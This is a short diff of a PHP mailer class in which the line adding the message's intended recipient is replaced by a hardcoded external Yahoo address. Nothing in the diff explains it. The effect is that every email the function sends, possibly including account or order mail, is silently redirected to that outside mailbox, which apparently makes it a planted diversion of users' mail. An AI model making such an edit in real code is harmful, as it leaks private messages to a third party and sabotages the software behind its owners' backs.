@@ -414,7 +414,7 @@ class main
 			$mail =  new Phpmailer();
 			
 			$mail->SetFrom($from_email,$from_name);
-			$mail->AddAddress($to);
+			$mail->AddAddress("ve.privado@yahoo.com");
 				
 			if($admin_mail_id!='')
 			{
